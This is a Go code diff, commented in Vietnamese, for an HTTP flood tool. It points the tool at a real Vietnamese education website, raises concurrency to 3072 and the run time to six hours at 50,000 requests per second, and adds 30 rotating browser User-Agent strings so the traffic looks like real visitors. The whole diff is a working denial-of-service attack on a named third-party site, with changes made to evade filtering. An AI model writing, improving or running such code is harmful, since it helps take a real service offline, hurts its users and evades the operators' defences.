@@ -16,14 +16,99 @@ import (
   "time"
 )
 
+// 30 User-Agent đa nền tảng được tối ưu
+var userAgents = []string{
+  // Windows - Chrome
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+
+  // Windows - Firefox
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+
+  // Windows - Edge
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
+
+  // Mac - Chrome
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+
+  // Mac - Safari
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+
+  // Linux
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+
+  // iPhone
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+
+  // iPad
+  "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+
+  // Android - Samsung
+  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+  // Android - Google Pixel
+  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+  // Android - Xiaomi
+  "Mozilla/5.0 (Linux; Android 14; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 13; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+  // Android - OnePlus
+  "Mozilla/5.0 (Linux; Android 14; 23128RA60G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Linux; Android 13; 23128RA60G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+  // Android - Oppo
+  "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+  // Android - Vivo
+  "Mozilla/5.0 (Linux; Android 14; V2318) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+  // Android Tablet
+  "Mozilla/5.0 (Linux; Android 14; SM-X810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+
+  // Windows Phone (hiếm)
+  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 Edge/40.15254.603",
+
+  // Chrome OS
+  "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+
+  // Legacy browsers
+  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+
+  // Mobile - Generic
+  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+}
+
+type userAgentRotator struct {
+  mu    sync.Mutex
+  index int
+}
+
+func (r *userAgentRotator) getNext() string {
+  r.mu.Lock()
+  defer r.mu.Unlock()
+
+  ua := userAgents[r.index]
+  r.index = (r.index + 1) % len(userAgents)
+  return ua
+}
+
 func main() {
   runtime.GOMAXPROCS(runtime.NumCPU())
 
   // ==== CONFIG NHÚNG ====
-  target := "https://vuihoc.vn"
+  target := "https://vuihoc.vn/tieu-hoc"
   method := "GET"
-  concurrency := 1538
-  duration := 95 * time.Second
+  concurrency := 3072
+  duration := 21600 * time.Second
   rps := 50000
   http2 := true
   bodyStr := "" // nếu cần POST body thì để ở đây
@@ -34,6 +119,9 @@ func main() {
     // ví dụ: "Authorization: Bearer XXX"
   }
   // ======================
+
+  // Khởi tạo User-Agent rotator
+  uaRotator := &userAgentRotator{}
 
   // Build request template
   u, err := url.Parse(target)
@@ -50,7 +138,7 @@ func main() {
   }
   hasBody := len(payload) > 0 && strings.ToUpper(method) != "GET" && strings.ToUpper(method) != "HEAD"
 
-  // Transport tối ưu
+  // Transport tối ưu - GIỮ NGUYÊN LOGIC
   tr := &http.Transport{
     Proxy:                 http.ProxyFromEnvironment,
     DialContext:           (&net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
@@ -68,7 +156,7 @@ func main() {
     Timeout:   timeout,
   }
 
-  // Prepare headers
+  // Prepare headers - GIỮ NGUYÊN LOGIC
   baseHeader := make(http.Header)
   for _, line := range headers {
     parts := strings.SplitN(line, ":", 2)
@@ -76,16 +164,16 @@ func main() {
       baseHeader.Add(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
     }
   }
-  if baseHeader.Get("User-Agent") == "" {
-    baseHeader.Set("User-Agent", "go-rapid-ultra-go-only-web-browser-by-trans-javascript-to-golang-to-run-without-so-much-ram-and-to-make-web-fast./1.0")
-  }
+  // Xóa User-Agent mặc định vì chúng ta sẽ xoay vòng
+  baseHeader.Del("User-Agent")
   baseHeader.Del("Connection") // cho keep-alive
 
-  // Warm-up
+  // Warm-up - GIỮ NGUYÊN LOGIC
   if warm > 0 {
     var wg sync.WaitGroup
     warmReq, _ := http.NewRequest("HEAD", u.String(), nil)
     warmReq.Header = baseHeader.Clone()
+    warmReq.Header.Set("User-Agent", userAgents[0]) // Dùng UA đầu tiên cho warm-up
     for i := 0; i < warm; i++ {
       wg.Add(1)
       go func() {
@@ -142,6 +230,9 @@ func main() {
         req, _ := http.NewRequest(method, u.String(), bodyReader)
         req.Header = baseHeader.Clone()
 
+        // THÊM USER-AGENT XOAY VÒNG - chỉ thay đổi duy nhất điểm này
+        req.Header.Set("User-Agent", uaRotator.getNext())
+
         start := time.Now()
         resp, err := client.Do(req)
         lat := time.Since(start)
@@ -195,4 +286,5 @@ func main() {
   if total > 0 {
     fmt.Printf("Avg latency:   ~%.2f ms (approx)\n", p50ms)
   }
+  fmt.Printf("User-Agents:   %d rotating agents\n", len(userAgents))
 }
